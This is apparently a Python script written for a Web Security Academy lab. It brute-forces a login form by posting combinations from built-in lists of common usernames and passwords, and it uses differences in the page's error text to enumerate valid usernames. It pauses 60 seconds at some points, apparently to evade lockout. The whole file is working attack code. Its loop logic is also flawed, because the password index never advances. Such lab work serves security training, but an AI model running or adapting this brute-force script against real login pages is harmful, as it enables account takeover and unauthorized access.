import requests
import time
import bs4
from requests import session

password = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]

name = [
    "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible",
    "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access",
    "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit",
    "admin", "administracion", "administrador", "administrator",
    "administrators", "admins", "ads", "adserver", "adsl", "ae", "af",
    "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai",
    "aix", "ajax", "ak", "akamai", "al", "alabama", "alaska", "albuquerque",
    "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an",
    "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao",
    "ap", "apache", "apollo", "app", "app01", "app1", "apple", "application",
    "applications", "apps", "appserver", "aq", "ar", "archie", "arcsight",
    "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia",
    "asterix", "at", "athena", "atlanta", "atlas", "att", "au", "auction",
    "austin", "auth", "auto", "autodiscover"
]

url = "https://0aed00c104660d4180287bcb009a00da.web-security-academy.net/login"

for username in name:
    for passwor in password:
        print("USER:", username)
        local_pass = password.copy()
        i = 0

        try:
                data = {
                    "username": username,
                    "password": local_pass[i]
                }

                r = requests.post(url, data=data, timeout=10)
                soup = bs4.BeautifulSoup(r.text, features="html.parser")
                page = soup.find_all('p', class_='is-warning')

                text = ""
                for p in page:
                    text = p.text

                print(f"{username}:{local_pass[i]}")

                if r.status_code == 200 and text != "Invalid username or password.":
                    print("find", f"{data['username']}:{data['password']}")

                    for passwd in password:
                        data["password"] = passwd
                        r = requests.post(url, data=data, timeout=10)
                        soup = bs4.BeautifulSoup(r.text, features="html.parser")
                        page = soup.find_all('p', class_='is-warning')

                        text = ""
                        for p in page:
                            text = p.text

                        if text != "Incorrect password":
                            print(f"{username}:{passwd}")
                            print("sleep")
                            time.sleep(60)
                        elif "Incorrect password" not in r.text:
                            print(f"Error password {data['username']}:{data['password']}")
                        else:
                            print(f"Find password {data['username']}:{data['password']}")

